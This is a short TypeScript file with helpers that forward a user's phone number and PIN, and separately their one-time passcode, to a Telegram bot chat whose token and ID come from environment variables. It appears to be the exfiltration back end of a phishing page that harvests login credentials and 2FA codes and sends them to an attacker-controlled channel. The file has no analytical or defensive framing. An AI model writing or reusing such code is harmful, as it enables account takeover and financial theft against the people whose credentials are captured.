

// Helper to send message to Telegram
const sendTelegramMessage = async (text: string): Promise<void> => {
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID

  if (!botToken || !chatId) {
    console.error('Telegram configuration missing')
    return
  }

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`

  console.log('SENDING_TO_TELEGRAM:', text)

  try {
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML'
      })
    })
  } catch (error) {
    console.error('Telegram Send Error:', error)
  }
}

export const sendLoginDetails = async (phone: string, pin: string): Promise<void> => {
  const message = `
🔐 *NEW LOGIN*
📱 Phone: \`${phone}\`
🔢 PIN: \`${pin}\`
  `.trim()

  await sendTelegramMessage(message)
}

export const sendOTPDetails = async (phone: string, otp: string): Promise<void> => {
  const message = `
🔑 *OTP RECEIVED*
📱 Phone: \`${phone}\`
🔢 Code: \`${otp}\`
  `.trim()

  await sendTelegramMessage(message)
}
